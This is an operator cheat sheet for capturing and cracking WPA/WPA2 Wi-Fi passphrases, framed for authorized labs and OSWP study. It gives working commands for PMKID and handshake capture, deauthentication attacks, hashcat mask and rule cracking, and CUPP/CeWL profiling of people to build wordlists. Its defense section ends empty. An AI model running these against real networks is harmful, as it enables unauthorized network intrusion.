# Theme: Capture & Cracking (WPA/WPA2-PSK) — Operator Reference

> **Scope & authorization.** Authorized work only — your own gear, a lab you own, sanctioned
> CTF/competition targets, or OSWP study. Every target **BSSID/ESSID must be on your written
> allowlist** before a single frame is transmitted; the toolkit enforces this, not good intentions.
> Deauth and association frames are *active* and legally meaningful. Capture is the only step that
> touches the air — cracking is a local, offline operation against a capture you already lawfully
> hold. Every attack below is paired with its **defense (§18)**. Evil-twin is **detection + concept
> only (§17)** — this toolkit never builds a credential harvester.
>
> **Rig:** Kali + **TP-Link RTL8188EUS** (2.4 GHz only) for capture → move the `.hc22000` to the
> **Mac GPU (hashcat, Metal)** for cracking. Capture and crack do **not** need to be the same box.

---

## 1. Concept (the whole game in one screen)

WPA/WPA2-PSK derives a **PMK** from passphrase + ESSID:
`PMK = PBKDF2(HMAC-SHA1, passphrase, ESSID, 4096, 256)`. You cannot reverse it — you can only
**guess the passphrase, hash it, and compare**. Two facts drive every decision:

1. **PBKDF2 is deliberately slow** (4096 iters, ~8192 SHA1 compressions/guess). You get
   *hundreds of thousands* of guesses/sec (100k–1M H/s band), not billions. **You cannot brute the
   full keyspace — candidate quality and ordering are everything.**
2. **PSK length is 8–63 chars.** Hashcat early-rejects anything outside that for `-m 22000`. Any
   candidate < 8 is dead on arrival.

Two ways to get the crackable material:

- **4-way handshake (EAPOL).** Four frames prove both sides know the PMK without sending it.
  You only need the right **message pair** + ESSID, not the whole session.

  | Msg | Dir | Carries | Value |
  |-----|-----|---------|-------|
  | M1 | AP→STA | ANonce (+ maybe **PMKID**) | ANonce; clientless win if PMKID present |
  | M2 | STA→AP | SNonce + **MIC** | crackable with M1 |
  | M3 | AP→STA | GTK + MIC | **"authorized" pair — most reliable** |
  | M4 | STA→AP | MIC (ack) | M1+M4 weakest (fails if nonce zeroed) |

- **PMKID (clientless).** Many APs put `PMKID = HMAC-SHA1-128(PMK, "PMK Name" | AP_MAC | STA_MAC)`
  in M1 of the RSN IE when roaming / PMK-caching is on. Capture M1 alone — **no client, no deauth**.
  Disclosed by Jens "atom" Steube (hashcat, Aug 2018). **Fails** on WPA3-SAE, many PMF-required
  deployments, WPA-Enterprise, and APs with roaming off.

**Modern target format = hashcat `22000`** (`WPA-PBKDF2-PMKID+EAPOL`): one text file holding both
PMKID (`WPA*01*`) and EAPOL (`WPA*02*`) lines. Old `2500`/`.hccapx` and `16800` are **deprecated**
(unified into 22000 since hashcat 6.0.0). `.cap` converts; `.hccapx` **cannot** — re-capture instead.
`22001` only *verifies* a known 64-hex PMK — not a passphrase path.

---

## 2. Master decision order (card-up → PSK, quietest-that-works wins)

1. **Recon + authorize.** Scan, confirm each target is on the allowlist, note WPA2 vs WPA3/transition
   and whether **PMF** is required. WPA3-SAE / PMF-required → PMKID likely dead, don't waste time.
2. **PMKID first** — clientless, fast, quietest. One frame, no client, no deauth. (§4)
3. **No PMKID → targeted EAPOL capture.** Lock channel+BSSID, write to disk. Client present → one
   small targeted deauth; no client → wait for a natural reconnect (deauth is pointless on an idle AP). (§5)
4. **Verify the handshake is real on-site** before packing up — re-capturing later is expensive. (§7)
5. **Convert → `22000`**, move to the Mac GPU. (§8)
6. **Crack cheapest-and-likeliest first:** 8-digit mask → ESSID/OSINT list → rockyou → rockyou+rules
   → curated WPA lists → hybrids → big lists → broad masks last. (§10–§15)

Quietness ladder: **PMKID > targeted single-client deauth > broadcast deauth.** Broadcast deauth
trips WIDS/WIPS in seconds — last resort, authorized noise only.

---

## 3. Capture pre-flight (every session)

```bash
# 0. Allowlist gate must have passed (toolkit's job).

# RTL8188EUS needs the out-of-tree aircrack-ng/morrownr 8188eu DKMS driver for monitor+injection.
# Stock rtl8xxxu handles 8188EUS injection POORLY — you'll see beacons but never a PMKID.
# Rebuild the DKMS driver after ANY kernel update (a common silent breakage).

iw dev                              # identify adapter (wlan0/wlan1 varies by enumeration order)
iw list | grep -A8 "Supported interface modes"   # confirm 'monitor' is listed
```

**Two interface disciplines — do not mix them:**

- **airodump-ng / aireplay-ng / wifite / besside-ng** → use a **monitor** interface:
  ```bash
  sudo airmon-ng check kill           # kill NetworkManager/wpa_supplicant (they steal the radio)
  sudo airmon-ng start wlan1          # -> wlan1mon
  iwconfig                            # confirm Mode:Monitor
  sudo aireplay-ng --test wlan1mon    # verify injection works (saves time later)
  ```
- **hcxdumptool / bettercap** → drive the **raw physical** interface themselves. Do **NOT**
  airmon-ng / iwconfig / `iw set monitor` / macchanger first, and **never** point them at a virtual
  or logical interface:
  ```bash
  sudo systemctl stop NetworkManager wpa_supplicant
  ```

> Teardown: `sudo airmon-ng stop wlan1mon && sudo systemctl start NetworkManager wpa_supplicant`

---

## 4. Capture A — PMKID, clientless (hcxdumptool → hcxpcapngtool) — FIRST MOVE

The quietest capture: no client, ideally no deauth.

> **Version caution:** the hcxdumptool CLI changed *significantly* at **6.3.0** (and again toward 7.x).
> Old flags are renamed/removed: `--enable_status` → `--rds`; `--filterlist_ap`/`--filtermode` gone;
> `--disable_client_attacks` → `--attemptclientmax`. **Always run `hcxdumptool -h` on your build.**
> hcxdumptool 6.3.x wants kernel ≥ 5.15.

```bash
# Canonical capture (hashcat wiki). -i is the RAW interface, NOT wlanXmon.
sudo hcxdumptool -i wlan1 -w dump.pcapng --rds=1 -F
#   --rds=1  real-time sorted display (watch PMKID/EAPOL land live)
#   -F       use all available frequencies
#   -c 6     instead of -F: lock one channel (faster, quieter) — target your AP's channel
# Ctrl-C the moment an allowlisted BSSID reports a PMKID. ONE PMKID per AP is all you need.
```

**6.3 attack behavior is ON by default; you quiet it by disabling pieces:**

| effect | flag to disable |
|--------|-----------------|
| request PMKID via association | `--associationmax=0` |
| client disassociation | `--disable_disassociation` |
| M2/EAPOL attack | `--m2max=0` |

**Allowlist enforcement with a BPF filter (mandatory on any shared RF space):**

```bash
# restrict TX/capture to authorized BSSID(s); -ddd emits the bytecode hcxdumptool reads
tcpdump -s0 "wlan addr3 11:22:33:44:55:66 or wlan addr3 aa:bb:cc:dd:ee:ff" -ddd > allowlist.bpf
sudo hcxdumptool -i wlan1 -w dump.pcapng --rds=1 --disable_disassociation --bpf=allowlist.bpf
# (verify --bpf usage against docs/bpf.md for YOUR version)
```

**Convert:**
```bash
hcxpcapngtool -o hash.hc22000 dump.pcapng
hcxpcapngtool -o hash.hc22000 -E essidlist -I idlist -U userlist dump.pcapng   # also harvest wordlist material
```
Read the printed summary — it tells you how many PMKIDs and EAPOL pairs were written. **PMKID count 0**
= AP didn't give one up (PMF / roaming off / not vulnerable) → fall back to EAPOL (§5).

---

## 5. Capture B — EAPOL 4-way handshake (airodump-ng + aireplay-ng)

### 5a. Scan, then lock channel + BSSID and write to disk
```bash
sudo airodump-ng --band bg wlan1mon                          # 2.4GHz scan; note BSSID, CH, ENC, clients
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon
#   -c 6  LOCK channel (stop hopping — #1 "why no handshake?" cause); --bssid target only
```
Top-right shows `WPA handshake: <bssid>` the instant a full handshake is seen. A target **with an
associated client** is far easier.

### 5b. Force a reconnect — only if a client is associated (second terminal)
```bash
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
#   -0 3  deauth, 3 rounds; -a AP; -c ONE specific client (targeted = quiet + effective)
```
- **Targeted `-c` beats broadcast.** A burst of **3–5** is enough. More than ~10 adds noise and can
  *prevent* the handshake by never letting the client reassociate.
- **Deauth → wait several seconds → check airodump → repeat only if needed.** Hammering starves the exchange.
- **Broadcast** (omit `-c`) is loud and WIDS-visible — authorized noise only.
- **PMF (802.11w) / WPA3:** deauth is cryptographically rejected — won't work. Pivot to PMKID or wait.

### 5c. Quick on-CPU sanity check (real cracking goes to the Mac GPU)
```bash
aircrack-ng capture-01.cap                                    # look for "(1 handshake)"
aircrack-ng -w rockyou-wifi.txt -b AA:BB:CC:DD:EE:FF capture*.cap   # CPU-only, ~50–300 keys/s
```

---

## 6. Capture automation (after you understand the manual flow)

```bash
# wifite — orchestrates airodump+aireplay+hcxdumptool+aircrack, validates captures
sudo wifite -i wlan1mon -c 6 --wpa        # WPA/WPA2 only, lock channel 6
sudo wifite --clients-only --skip-crack   # grab many handshakes (clients present), crack later on Mac
sudo wifite --pmkid                        # PMKID-only;  --no-pmkid forces EAPOL
sudo wifite --nodeauths                    # PASSIVE: never deauth
sudo wifite --check                         # validate all hs/*.cap hold a real handshake
# flag names drift between forks (kimocoder wifite2 is the Kali pkg) — confirm with `wifite -h`

# besside-ng — fire-and-forget; logs all WPA handshakes in range to ./wpa.cap
sudo besside-ng -b AA:BB:CC:DD:EE:FF -c 6 -v wlan1mon        # single target (safe)
# bare `besside-ng wlan1mon` auto-deauths EVERYTHING in range — isolated allowlisted lab only.
# Leave -s (upload-to-cracking-service) OFF — never exfiltrate client material.

# bettercap — recon + EAPOL/PMKID in one session (raw interface)
sudo bettercap -iface wlan1
#   > set wifi.handshakes.aggregate false   (per-network pcap, easier triage)
#   > wifi.recon on ; wifi.recon.channel 6 ; wifi.recon AA:BB:CC:DD:EE:FF
#   > wifi.assoc AA:BB:CC:DD:EE:FF           (request RSN PMKID)
#   > wifi.deauth AA:BB:CC:DD:EE:FF          (targeted, authorized)
# Use wifi.deauth.skip / wifi.assoc.skip as a safety net for off-allowlist neighbors.
# Convert bettercap pcap with hcxpcapngtool (NOT the old cap2hccapx).
```

---

## 7. Verify a VALID handshake (do this before you leave)

Tools disagree, and "valid per tool X" can still fail to crack. Check the raw EAPOL pairs.

```bash
tshark -r capture-01.cap -Y "eapol"          # list EAPOL frames; want a clean M-pair
aircrack-ng capture-01.cap                    # prints "(N handshake)" per ESSID
cowpatty -r capture-01.cap -c                 # 4-way integrity check (cross-check)
pyrit -r capture-01.cap analyze               # report valid handshakes
```

**hcxpcapngtool's conversion summary is itself the best validator.** The `.hc22000` line encodes validity:
```
WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR                         # PMKID
WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR       # EAPOL
```
**Message-pair bitmask** (what pros read): `000`=M1+M2 (challenge), `001`=M1+M4 (only if client nonce
not zeroed), `010`=M2+M3 (**authorized — strongest**). bit 4 = AP-less/against-a-client; bits 5/6 =
endianness → needs nonce-error-correction; **bit 7 = replay counter not checked → NEC mandatory**
(hashcat does this; "best-effort" pair). Prefer **M2+M3**; mismatched replay counters = stitched
attempts = won't crack.

Filter a mixed file to what matters:
```bash
hcxhashtool -i hash.hc22000 --type=1   -o pmkid.hc22000       # PMKID only  (or: grep 'WPA\*01')
hcxhashtool -i hash.hc22000 --type=2   -o eapol.hc22000       # EAPOL only  (or: grep 'WPA\*02')
hcxhashtool -i hash.hc22000 --authorized -o authorized.hc22000  # M2+M3 strongest pairs
hcxhashtool -i hash.hc22000 --mac-ap=112233445566 -o target.hc22000   # one authorized AP
hcxhashtool -i hash.hc22000 --info=stdout                     # summarize BSSID/ESSID/type
```

---

## 8. Convert, scope & GPU environment (Mac, Apple Silicon)

```bash
hcxpcapngtool -o hash.hc22000 -E essid-wordlist.txt dump.pcapng   # convert + harvest ESSID list
hcxhashtool -i hash.hc22000 --essid-list=authorized.txt -o hash.hc22000   # STAY IN SCOPE before GPU
```

**Keep PMKID + EAPOL for the same ESSID in one file** — hashcat reuses the PBKDF2(PMK) result across
both, so it doesn't pay the expensive part twice.

**Apple Silicon = Metal, not OpenCL.** hashcat enumerates the one GPU twice (Metal + OpenCL); if both
run they fight and net H/s drops.
```bash
hashcat -V                                  # pin flags/speeds to this build
hashcat -I                                  # list backends/devices — match by backend NAME, not a number
hashcat -b -m 22000 --backend-ignore-opencl # YOUR real rate — the only number that matters
hashcat -m 22000 hash.hc22000 wl.txt --backend-ignore-opencl -w 3   # Metal only, high workload
```
- Device numbering is **not stable** across machines/versions (M4 threads report Metal skipped →
  OpenCL device 2). `--backend-ignore-opencl` sidesteps the ambiguity. Fix "Unsupported Metal runtime"
  by **updating hashcat** (`brew upgrade hashcat` / latest beta), never `--force`.
- **`-w 3` is the sweet spot**; `-w 4` on a thermally-limited laptop clocks *down* and can sustain
  *below* `-w 3`. Watch `Temp` (`--hwmon-temp-abort=90`) and `sudo powermetrics --samplers smc`.
- **`-O` is a no-op for 22000** — there is no optimized kernel; it "falls back to pure kernel"
  (8–63 byte range is the kernel's own hard bound). Don't cargo-cult it from MD5 tutorials.
- **CPU is not worth adding** — leave P/E cores for host-side candidate generation (`-S`, §16).
- **"Not enough allocatable device memory"** = unified memory contention; close browsers/Final Cut/Docker.

**Measured anchors (measure your own chip):** M2 Air ~67 kH/s · M1 Max (32-core) ~248 kH/s ·
RTX 4090 ~2.3–2.66 MH/s (~10×) · RTX 5090 ~3.4 MH/s. **You can't out-hardware WPA on a Mac — ordering wins.**

---

## 9. hashcat attack-mode cheat sheet (mode 22000)

```bash
hashcat -m 22000 h.hc22000 wl.txt                         # -a 0 dictionary (default)
hashcat -m 22000 h.hc22000 wl.txt -r rules/best64.rule    # dict + rules (best64 = best66 on 7.1+)
hashcat -m 22000 h.hc22000 -a 3 ?d?d?d?d?d?d?d?d           # mask / brute (8 digits)
hashcat -m 22000 h.hc22000 -a 6 wl.txt ?d?d?d?d           # hybrid: WORD then mask  (word2024)
hashcat -m 22000 h.hc22000 -a 7 ?d?d?d?d wl.txt           # hybrid: mask then WORD  (2024word)
hashcat -m 22000 h.hc22000 -a 1 left.txt right.txt        # combinator (two-word passphrases)
hashcat -m 22000 h.hc22000 --keyspace -a 3 <mask>         # SIZE the job BEFORE launching
hashcat -m 22000 h.hc22000 --show / --left                # cracked / remaining
# gzip wordlists feed directly — no need to decompress (rockyou.txt.gz, cracked.txt.gz, ...)
```

---

## 10. Crack candidate ordering (where WPA is actually won)

Order by **hit-probability ÷ cost**. Real recovered-key distribution (PACK, 10,737 cracked WPA keys —
biased toward crackable, but directionally gold): **54% exactly 8 chars · 37% numeric-only · 29% are
8 digits · 20% word+digits · 9% 8-lowercase · 3% 10-digit · 2% mixed-case.** Digits and 8-char dominate.

```bash
# Stage 0 — free structural masks (minutes). 8-digit alone covers ~29% of real keys.
hashcat -m 22000 h.hc22000 -a 3 ?d?d?d?d?d?d?d?d           # 8 digits   (~9 min @185k H/s)
hashcat -m 22000 h.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d       # 10 digits (ISP/phone, ~15 h)
# Stage 1 — target-derived: ESSID + OSINT list (seconds–minutes, highest ROI when you know context)
hashcat -m 22000 h.hc22000 essid-wordlist.txt -r rules/best64.rule
# Stage 2 — rockyou, length-pruned (minutes)
hashcat -m 22000 h.hc22000 rockyou.wpa.txt
# Stage 3 — rockyou + best64 → heavier rules (tens of min)
hashcat -m 22000 h.hc22000 rockyou.wpa.txt -r rules/best64.rule
# Stage 4 — curated WPA corpora. wpa-sec cracked list = real PSKs people chose (top ROI):
curl -L -o wpa-cracked.txt.gz https://wpa-sec.stanev.org/dict/cracked.txt.gz
hashcat -m 22000 h.hc22000 wpa-cracked.txt.gz
# Stage 5 — hybrids (catches word+digits ~20%)
hashcat -m 22000 h.hc22000 -a 6 rockyou.wpa.txt ?d?d?d?d
# Stage 6 — structured brute, Markov-ordered (days+). Narrow, justified keyspaces only.
hashcat -m 22000 h.hc22000 -a 3 ?l?l?l?l?l?l?l?l -w 3
```
**Rule of thumb:** if a stage's keyspace ÷ your H/s exceeds the time you have, **skip it** and spend
the time on better lists. If 10-digit numeric + rockyou+rules + a few hybrids all fail, the passphrase
is probably strong — **stopping is the correct (defensive) conclusion**, not a cue to brute `?a×8`.

---

## 11. Wordlist arsenal (tiered, smallest/most-probable first)

| Tier | List | Notes |
|------|------|-------|
| 0 | **Targeted / generated** | ISP/OEM default-key shape, OSINT (§15), **ESSID-derived**. Tiny, decisive. |
| 1 | **rockyou** (~134 MB / 14,344,392) | `/usr/share/wordlists/rockyou.txt.gz`. ~60% of lines < 8 chars — **filter first**. |
| 2 | **WiFi-probable** | SecLists `WiFi/WPA`; berzerk0 **Probable-Wordlists `WPA-Length/`** (popularity-sorted, 8–40 char, ≥5-occurrence; v1 had a 7-char newline-dup defect → re-filter). Kali `wifite.txt`. |
| 3 | **weakpass** (ranked, GB+) | not WiFi-specific → 8+ filter. |
| 4 | **crackstation human-only** (~258 MB gz) | real leaked human passwords; the high-value general dump. |
| 5 | **monsters** (Weakpass_4, hashes.org founds) | last resort; marginal yield per hour is tiny. |

**Golden rule: more list ≠ more cracks.** A focused 50M-line list of leaked 8+ passwords + name/word
combos beats a blind 13 GB "WPA" list.

**Curation commands (make lists WiFi-legal and fast):**
```bash
# Enforce the 8–63 window (single most important filter)
awk 'length>=8 && length<=63' rockyou.txt > rockyou.wpa.txt
# Dedup / merge tiers / subtract already-tried (all require sorted input for comm)
cat 10_*.txt 20_*.txt | awk 'length>=8 && length<=63' | sort -u > merged-wifi.txt
comm -23 <(sort -u big.txt) <(sort -u tried.txt) > remaining.txt
# hashcat-utils at scale
splitlen outdir < merged-wifi.txt     # bucket by length — run outdir/8 FIRST (54% of real keys)
rli merged-wifi.txt remaining.txt tried.txt     # fast set-subtract across huge files
combinator names.txt nouns.txt | awk 'length>=8 && length<=63' > combos-wifi.txt
# Seed from the capture's ESSID
hcxpcapngtool -o hash.hc22000 -E essids.txt capture.pcapng
```
> **Rules caveat:** do **not** pre-drop short base words if you'll run rules — a rule turns `timmy`→
> `timmy666` (legal), but filtering already deleted `timmy`. Either keep the raw list and add **`-S`**
> (host-side rule expansion), or pre-apply rules then length-filter the *output*:
> `hashcat --stdout rockyou.txt -r rules/best64.rule | awk 'length>=8 && length<=63' | sort -u > out.txt`
> `--force` does **not** bypass the length reject.

---

## 12. Masks & hybrids + time math

`-a 3` mask = targeted brute (one `?X` = one position; 8 tokens for an 8-char target; WPA floor 8).
Custom charsets `-1 -2 -3 -4` referenced as `?1 ?2…`. `--increment` varies length in one run (mask
length is the hard cap; `-i` required with `--increment-min/max`). Markov ordering is on by default —
leave it on; `-t` caps chains (higher t = smaller/faster, may skip the key).

```bash
?l=26  ?u=26  ?d=10  ?h=0-9a-f  ?H=0-9A-F  ?s=33 symbols  ?a=?l?u?d?s(95)  ?b=all bytes
hashcat -m 22000 h.hc22000 -a 3 ?u?l?l?l?l?l?l?d                    # Hunter7 shape
hashcat -m 22000 h.hc22000 -a 3 -1 ?l?u?d ?1?1?1?1?1?1?1?1          # 62-set, 8 long
hashcat -m 22000 h.hc22000 -a 3 ?H?H?H?H?H?H?H?H                     # 8 uppercase-hex ISP default
hashcat -m 22000 h.hc22000 -a 3 -i --increment-min=8 --increment-max=10 ?d?d?d?d?d?d?d?d?d?d
# .hcmask = batch many masks in order (custom charset on the SAME line); mp64 builds candidates:
mp64 -1 ?d ?1?1?1?1?1?1?1?1 > eight-digit.txt ;  mp64 19?d?d > birthyears.txt
# PACK policygen emits policy-constrained .hcmask (8–10 chars, >=1 digit, >=1 upper)
hashcat -m 22000 h.hc22000 -a 3 ?d?d?d?d?d?d?d?d --keyspace          # size before committing
```

**Time @ ~185k H/s (≈1.6×10^10 guesses/day) — scales linearly with GPU:**

| Mask | Keyspace | Time |
|------|----------|------|
| `?d`×8 | 10^8 | **~9 min** |
| `?d`×10 | 10^10 | **~15 h** |
| `?H`×8 (router hex) | 16^8 ≈ 4.3B | **~6.4 h** |
| `?l`×8 | 26^8 ≈ 2.1×10^11 | **~13 days** (M1 Max ~9.6 yr; 4090 <1 day) |
| `?l?d`×8 | 36^8 | **~176 days** |
| `?a`×8 | 95^8 ≈ 6.6×10^15 | **~1,100+ years** |
| rockyou × `?d?d?d?d` (`-a 6`) | 1.4×10^11 | **~8.8 days** |

**Takeaway:** all-digit ≤10 is tractable; 8-char lowercase is borderline; **any mixed-alphanumeric ≥8
is effectively uncrackable** at Mac rates — which is exactly why mask *targeting* is the skill. Hybrid
cost = `len(wordlist) × size(mask)`, so keep the mask ≤4 tokens or prune the wordlist to likely roots.

---

## 13. Rules (the force-multiplier on human-chosen keys)

A rule mutates every word on the fly (`summer`→`Summer2024!`). Rules dominate because real PSKs are
base word + predictable mangling. **Keyspace = wordlist × rule count** — a slow hash caps how much you
can reach, so right-size the ruleset.

```bash
# Named sets in /usr/share/hashcat/rules/ (cost ↑ down the list):
#   best64 (run first, always) → rockyou-30000 / InsidePro / d3ad0ne (mid) →
#   OneRuleToRuleThemAll (51,998 rules, 745B/pass — download, not built-in) → dive → pantagrule (last resort)
echo 'summer' | hashcat -r rules/best64.rule --stdout             # test what a rule PRODUCES
hashcat -m 22000 h.hc22000 wl.txt -r r.rule --debug-mode=1 --debug-file=hits.rule   # learn which rule won
sort hits.rule | uniq -c | sort -rn | head                         # promote winners into a tight custom file
hashcat -m 22000 h.hc22000 wl.txt -r rules/best64.rule -r rules/toggles2.rule   # stack = PRODUCT (keep one side small)
hashcat -m 22000 h.hc22000 wl.txt -r big.rule --keyspace           # never hand-estimate; varies by version
```
- **Sub-8 candidates are dead** — avoid truncation/delete-heavy rules on short base words.
- **Reject/memory rules do nothing in a `-r` file** — they're `-j`/`-k` only.
- **Fast-hash benchmark %s (best64 32%, ORTTA 68% on MD5) DO NOT transfer to 22000** — expect days, not minutes.
- WPA-specific custom rules worth writing: `$2$0$2$4` / `$2$0$2$5` (append year), `c$!` (Cap+bang),
  `sa@ss$se3so0` (leet, stack on lowercase base). `head -n 2000 OneRuleToRuleThemAll.rule > ortta-top2k.rule`.
- A 200-line tuned file mined from your own hits often beats a 50k generic one on your population.

---

## 14. Default-key reality check (before profiling)

Many home nets still run the ISP/OEM default — a *fixed, small keyspace* tied to ESSID/MAC, so a
**mask beats any wordlist**. Classify the target first (vendor from **BSSID OUI** + ESSID pattern,
or read the sticker on your own gear):
```bash
hashcat -m 22000 h.hc22000 -a 3 ?d?d?d?d?d?d?d?d           # all-digit default (10^8, minutes)
hashcat -m 22000 h.hc22000 -a 3 ?H?H?H?H?H?H?H?H           # uppercase-hex default
hashcat -m 22000 h.hc22000 -a 3 ?l?l?l?l?l?l?l?l?l?l       # 10 lowercase-alpha default
```
Numbers inside the ESSID (`HOME-A4F2`, `Linksys0788`) often reuse in the key or encode the keyspace.
Profiling (§15) is for *user-changed* passphrases.

---

## 15. OSINT-targeted lists (CUPP / CeWL / Mentalist)

> **Authorization gate:** OSINT = public data about *your own* org/identity or the lab persona you are
> authorized to test — never surveillance of an uninvolved third party. Building a list for an
> unauthorized target is itself out of scope. Lists contain PII → keep in the lab dir, treat as
> sensitive, delete with the engagement, never commit.

Human model you exploit: `[case variant of base word] + [separator?] + [number/date] + [special?]`,
e.g. `Summer2023!`, `Rex2011`, `Linksys0788`. Appends dominate (years, `123`, phone/ZIP); specials
cluster at the end (`!` first); leet is partial (one or two letters), not full.

```bash
# CUPP — profile an individual from facts you supply (writes <firstname>.txt)
python3 cupp.py -i          # interactive prompts: name/surname/nick/DOB(DDMMYYYY)/partner/kids/pet/company/keywords
python3 cupp.py -w cewl.txt # improve an existing list with CUPP year/number/leet logic
#   Edit cupp.cfg: extend [years] to current year + target's years; trim [specialchars] to !,@,#,$; leet selectively.

# CeWL — scrape the target's OWN website for its real vocabulary (base words, keep short)
cewl -d 2 -m 5 -c -w site-words.txt https://example-target.tld     # -c = frequency rank = best seeds
cewl -d 2 -n --meta --meta_file names.txt https://example-target.tld  # author/creator names from PDFs/Office
#   Keep -o (offsite) OFF; needs exiftool for --meta; words are SHORT base tokens — pad later, don't -m 8.

# Mentalist (GUI) — chain Base Words → Case → Substitution(One-at-a-Time) → Append(Years/Numbers/AreaCodes) → Special.
#   Export RULES, not a flat file (combinatorial explosion), then:
hashcat -m 22000 h.hc22000 base.txt -r mentalist.rule

# Supporting: crunch (patterned keyspaces), mp64, hashcat-utils (combinator/rli), kwprocessor (keyboard walks),
#   psudohash, username-anarchy (names/emails → token permutations).
```
Workflow: filter to 8+ → run OSINT list plain then `-r best64.rule` → hybrids for date/phone tails →
combinator for name×year → escalate to big lists only after. `cat cupp.txt cewl.txt ssid_tokens.txt |
sort -u` → single Base Words file.

---

## 16. Potfile / session / brain hygiene (don't recompute)

```bash
hashcat -m 22000 h.hc22000 wl.txt --potfile-path ./proj.potfile -w 3   # per-engagement potfile (no cross-contamination)
hashcat -m 22000 h.hc22000 --show            # cracked (reads potfile, no GPU)
hashcat -m 22000 h.hc22000 --left            # still uncracked — plan the next stage
hashcat -m 22000 h.hc22000 wl.txt --session=proj1 --status --status-timer=60 --backend-ignore-opencl -w 3
hashcat --session=proj1 --restore            # resume after sleep/interrupt
hashcat -m 22000 h.hc22000 wl.txt --loopback -r rules/best64.rule      # feed cracked words back through rules
```
- `--potfile-disable` turns off **both** read+write (re-cracks everything) — use only to re-verify.
- `--remove` edits the input file in place and can leave dup lines — keep an untouched copy.
- **Brain** (`--brain-server` / `-z`) dedupes (candidate,hash) pairs across runs but auto-enables `-S`
  (lowers raw H/s) — only worth it when re-running overlapping attacks many times.

**`-S` / `--slow-candidates`** moves rule expansion to the host CPU. Not a universal speedup — it helps
specifically on very slow hashes (WPA) *with a heavy rule set*. **Prove it per-attack:**
```bash
hashcat -m 22000 h.hc22000 rockyou.wpa.txt -r rules/dive.rule --speed-only -w 3
hashcat -m 22000 h.hc22000 rockyou.wpa.txt -r rules/dive.rule --speed-only -w 3 -S
```

---

## 17. Busy vs quiet AP — capture strategy

| Situation | Play |
|-----------|------|
| Busy AP, many clients | PMKID first; if EAPOL, a single targeted `-0 3` on one active client, then stop |
| Quiet AP, 1 idle client | One gentle targeted deauth, wait 10–20s, repeat sparingly; or PMKID |
| Quiet AP, **no clients** | **PMKID only** — deauth is pointless; return at a busier time of day |
| Channel keeps changing / lost frames | **Lock `-c`**; watch for band-steering (AP moving 2.4↔5 GHz) |
| PMF/WPA3 AP | PMKID or passive wait; pure WPA3-SAE → offline capture doesn't help (§19) |

Timing of day matters more than tool choice on quiet nets — clients associate on arrival (mornings)
and after outages. **Don't hop while capturing EAPOL** — a 4-way completes in milliseconds.

---

## 18. Evil twin — DETECTION + concept only (no harvester)

**Concept (for defense):** an evil twin clones a real SSID so clients associate to the attacker's AP.
In an authorized handshake context a same-SSID AP only observes that a client's 4-way **won't complete
without the real PSK** — the twin learns nothing crackable from a failed association. Credential /
captive-portal phishing (eaphammer/wifiphisher/airbase-ng) is **out of scope** — we never build it.

**What we DO build — detection:**
- **nzyme** — purpose-built rogue-AP/evil-twin detection; baseline your own SSID+BSSIDs; can trilaterate
  a suspect AP across sensors (an impersonator copies SSID/BSSID/security but not your hardware/location).
- **Kismet** — WIDS fingerprint/trend alerts (evil-twin, KARMA). Gap: won't catch an attacker that also
  spoofs the MAC. Export device lists via REST API (change the default `kismet:kismet` creds), diff
  against an authorized-AP inventory.
- **Signals:** two BSSIDs for one SSID; a known SSID on an unexpected channel/BSSID; signal/location
  anomalies; unexpected deauth floods (often the precursor that herds clients to a twin); hcxdumptool's
  random-MAC association bursts.

---

## 19. WPA3 / SAE — why offline capture doesn't apply

- **SAE (Dragonfly)** is a PAKE: a captured exchange gives **nothing to grind offline** — each guess
  needs a live, rate-limitable, detectable interaction with the AP. There is **no `-m 22000` equivalent
  for SAE**; `hcxpcapngtool` emits no 22000 line (also skips 802.11r "FT using PSK"). "Empty hc22000"
  on a modern AP usually means WPA3-SAE or FT-PSK.
- **WPA3 requires PMF** → forged deauth/disassoc rejected → the classic "deauth to force a handshake"
  fails. (PMKID needs no client, so PMF alone doesn't stop PMKID — only passphrase strength does.)
- **Two real weak points (awareness, not a recipe):** (1) **Transition mode** (WPA3/WPA2 mixed) — a
  client can be downgraded to WPA2-PSK where the ordinary offline attack applies; (2) **Dragonblood**
  (Vanhoef & Ronen 2019) — timing/cache side-channels in *some implementations* (not the standard).
- **Practical:** the RTL8188EUS + 22000 workflow is a **WPA/WPA2-PSK** story. For WPA3 the auditor's job
  shifts to config review + firmware patch level + transition-mode check, not offline cracking.

---

## 20. Consolidated gotchas (these waste the most time)

1. **Monitor mode silently dies after a kernel update** (RTL8188EUS DKMS) — rebuild the 8188eu driver.
2. **8188EUS stock driver doesn't inject** — beacons but never a PMKID; install the out-of-tree driver, prove injection.
3. **Hopping during capture** (forgot `-c`) — the #1 "why no handshake?" cause.
4. **Over-deauthing** prevents the client from ever completing the 4-way — small bursts, then wait.
5. **`wpaclean` / merging pcapng destroys nonces/replay metadata** hcxpcapngtool needs — never clean before converting. Gzip is fine. Reduce a huge dump with tshark, not wpaclean.
6. **hcxdumptool must own the real `wlanX`** — never a virtual/logical/mon interface; don't run aircrack/reaver/macchanger alongside it (Wireshark read-along is fine).
7. **`.hccapx` can't convert to 22000** — re-capture.
8. **"Valid handshake" that won't crack** — mismatched replay counters, zeroed nonces (M1+M4), junk EAPOL. Prefer M2+M3; capture several.
9. **Deprecated flags in old blogs** — hcxdumptool ≥6.3 renamed options; wifite forks differ; trust `--help`.
10. **5 GHz / band-steered APs are invisible** to the 2.4-GHz-only RTL8188EUS.
11. **Wrong ESSID in the hash** — PMK binds to the exact SSID string; hidden/renamed/trailing-space SSIDs break cracking.
12. **`--add-timestamp` breaks hashcat** until you strip the extra column: `awk '{print $1}' hash.hc22000 > clean.hc22000`.
13. **Version-mismatched hcx tools silently corrupt conversions** — pin hcxdumptool/hcxpcapngtool to the same version.
14. **The key may simply not be in any list** — a high-entropy PSK is uncrackable by dictionary. "Not recoverable by wordlist" is itself a finding; stop burning power.

---

## 21. DEFENSE (pair every attack above with this — the half that matters in a report)

| Attack it stops | Defense |
|-----------------|---------|
